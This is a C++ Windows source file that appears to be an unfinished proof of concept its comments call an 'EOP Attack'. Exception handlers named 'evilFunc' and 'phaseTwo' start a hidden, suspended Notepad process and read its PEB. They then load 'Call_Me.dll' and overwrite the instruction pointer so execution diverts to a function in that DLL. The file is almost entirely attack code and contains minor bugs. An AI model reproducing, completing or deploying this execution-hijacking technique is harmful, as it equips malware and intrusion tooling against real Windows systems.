#include <iostream>
#include <Windows.h>
#include <string>
#include <winternl.h>
#include <winnt.h>

using namespace std;

#pragma warning(suppress: 6387)
// Statically load ntdll for NtQuerySysinfo function
#pragma comment(lib, "ntdll.lib")

// Define Globals
LPCWSTR g_TargetProc = L"C:\\Windows\\system32\\Notepad.exe";
PVOID g_MyFunc = nullptr;
PVOID g_MyOtherFunc = nullptr;

typedef NTSTATUS(WINAPI* pNtQUeryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

BOOL DummyProcCreate(IN LPCWSTR procName) {

	PROCESS_BASIC_INFORMATION pbi;
	ULONG retLen;
	STARTUPINFO si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION pi = { 0 };
	RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	BOOL MakeProcAppear = CreateProcessW(g_TargetProc,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW | CREATE_SUSPENDED, // Create Suspended to try and acquire PEB or other data structures like CONTEXT
		NULL,
		NULL,
		&si,
		&pi);
	if (!MakeProcAppear) {
		cout << "[!] CreateProcessW failed with error: 0x" << hex << GetLastError() << endl;
		return FALSE;
	}
	DWORD pid = pi.dwProcessId;
	HANDLE hProc = pi.hProcess;
	HANDLE hThread = pi.hThread;
	
	if (pid == NULL || hProc == NULL || hThread == NULL) {
		return FALSE;
	}

	cout << "[+] Process started with PID: " << pid << endl;


	pNtQUeryInformationProcess NtQueryInformationProcess = (pNtQUeryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	if (!NtQueryInformationProcess) {
		cout << "[!] Error retreiving address of NT function 0x" << hex << GetLastError() << endl;
		return FALSE;
	}
	NTSTATUS status = NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
	if (status != 0) {
		cout << "[!] Error acquiring handle to PEB with error 0x" << hex << GetLastError() << endl;
		return FALSE;
	}
	PEB peb;
	SIZE_T bytesRead{};

	if (!ReadProcessMemory(hProc, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead)) {
		cout << "[!] Error Reading from PEB 0x" << hex << GetLastError() << endl;
		return FALSE;
	}
	// ENumerate PEB Addr
	// PEB Size
	// PEB Fields
	// POC Phase I
	cout << "============= Gathering PEB Statistics ==============" << endl;
	cout << "[+] PEB Base Address: " << hex << pbi.PebBaseAddress << endl;
	cout << "[+] PEB Size: " << sizeof(peb) << " bytes" << endl;
	cout << "[+] Value of IsDebugged: " << int(peb.BeingDebugged) << endl;

	cout << endl;

	return TRUE;

	/*
	WaitForSingleObject(pi.hProcess, 500);
	TerminateProcess(hProc, 0);
	CloseHandle(hProc);
	CloseHandle(hThread);
	*/
}

BOOL FindDLL(VOID) {

	// Dynamically load DLL
	HMODULE hMod = GetModuleHandle(L"Call_Me.dll");
	if (hMod == NULL) {
		cerr << "[!] Could not find module in proc address space" << endl;
		cout << "[+] Now attempting to load module..." << endl;
		hMod = LoadLibraryA("Call_Me.dll");
		if (hMod != NULL) {
			cout << "[+] Success...Now locating func address" << endl;
		}
	}
	// Get address to pass to CONTEXT->RIP
	PVOID funcAddr = GetProcAddress(hMod, "FuncToCall");
	if (funcAddr == nullptr) {
		cerr << "[!] GetProcAddress failed with error: 0x" << hex << GetLastError() << endl;
		return FALSE;
	}
	cout << "Success! Function Address found at 0x" << hex << funcAddr << endl;
	// Assign funcAddr to global variable for RIP assignment
	g_MyFunc = funcAddr;

	PVOID funcAddrTwo = GetProcAddress(hMod, "benignFunction");
	if (funcAddrTwo == nullptr) {
		cerr << "[!] GetProcAddress failed with error: 0x" << hex << GetLastError() << endl;
		return FALSE;
	}
	g_MyOtherFunc = funcAddrTwo;
	cout << "Success! Benign Function Address found at 0x" << hex << funcAddrTwo << endl;
	return TRUE;
}



BOOL evilFunc(IN PEXCEPTION_POINTERS pExceptionInfo) {
	CONTEXT* pCtx = pExceptionInfo->ContextRecord;
	// Evil Function to invoke after VEH chain registration and invocation
	// Attempting New EXCEPTION criteria
	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) {
		cout << "[!] We have a violation! Now Phase 1 of EOP Attack..Read PEB Base Address" << endl;
		if (!DummyProcCreate(g_TargetProc)) {
			cout << "[!] Error creating Process with error 0x" << hex << GetLastError() << endl;
			return FALSE;
		}

		}
	return TRUE;
}

BOOL phaseTwo(IN PEXCEPTION_POINTERS pExceptionInfo) {
	CONTEXT* pCtx = pExceptionInfo->ContextRecord;
	// Evil Function to invoke after VEH chain registration and invocation
	// Attempting New EXCEPTION criteria
	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
		cout << "[!] We have another violation! Now Initiating Phase 2 of EOP Attack..RIP manipulation" << endl;
		if (!FindDLL()) {
			cerr << "[!] Error with FindDLL function: 0x" << hex << GetLastError() << endl;
		}
		return TRUE;
		cout << "[!] Phase 2 succeeded!" << endl;

	}
	return FALSE;
}



LONG CALLBACK CustomExcHandler(PEXCEPTION_POINTERS pExceptionInfo) {
	CONTEXT* pCtx = pExceptionInfo->ContextRecord;

	// Call evilFunc in the event of an exception
	if (!evilFunc(pExceptionInfo)) {
		// Handle BP Exception
		cout << "[!] EvilFunc failed!" << endl;
		return EXCEPTION_EXECUTE_HANDLER;
	}

	return EXCEPTION_CONTINUE_SEARCH;  // Continue searching for other handlers if RIP wasn't modified
}

LONG CALLBACK NewExecHandler(PEXCEPTION_POINTERS pExceptionInfo) {
	CONTEXT* pCtx = pExceptionInfo->ContextRecord;

	// Call phaseTwo in the event of an exception
	if (!phaseTwo(pExceptionInfo)) {
		cerr << "[!] Error with PhaseTwo function: 0x" << hex << GetLastError() << endl;
		return EXCEPTION_CONTINUE_SEARCH; // Continue searching for other handlers if RIP wasn't modified
	}

	cout << "[+] Current Address @ RIP: 0x" << hex << pCtx->Rip << endl;
	pCtx->Rip = reinterpret_cast<DWORD64>(g_MyFunc);  // Modify RIP to g_MyFunc
	cout << "[+] New Address @ RIP: 0x" << hex << pCtx->Rip << endl;
	if (pCtx->Rip == (DWORD64)g_MyFunc) {
		cout << "[+] Now directing execution to g_MyFunc Address" << endl;
	}
	return EXCEPTION_CONTINUE_EXECUTION; // Execute RIP manipulation function

}


